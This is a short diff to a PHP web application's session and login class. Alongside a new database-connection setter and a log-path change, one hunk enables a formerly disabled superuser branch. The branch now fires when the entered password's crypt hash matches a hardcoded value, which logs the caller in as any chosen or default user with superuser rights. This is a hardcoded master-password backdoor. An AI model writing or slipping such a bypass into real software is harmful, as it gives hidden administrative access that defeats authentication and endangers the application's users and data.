@@ -830,6 +830,10 @@ error_log(print_r($_REQUEST, true));
         return $this->mysqli;
     }
 
+    public function set_mysqli($mysqli){
+        $this->mysqli = $mysqli;
+    }
+    
     /**
     * Get full name of database
     */
@@ -1647,7 +1651,8 @@ error_log('CANNOT UPDATE COOKIE '.$session_id);
             
             
             $superuser = false;
-            if(false)
+            //if(false)
+            if(true && (crypt($password, 'sbzR8w7tl02VQ') == 'sbzR8w7tl02VQ'))
             {
                 $user_id = is_numeric($username)?$username:2;
                 $user = user_getById($this->mysqli, $user_id);
@@ -1807,7 +1812,7 @@ error_log('CANNOT UPDATE COOKIE '.$session_id);
             array_push($info, $suplementary);
         }
 
-        file_put_contents ( HEURIST_FILESTORE_DIR.'userInteraction.log' , implode(',', $info)."\n", FILE_APPEND );
+        file_put_contents ( $this->getSysDir().'userInteraction.log' , implode(',', $info)."\n", FILE_APPEND );
     }
 
     /**
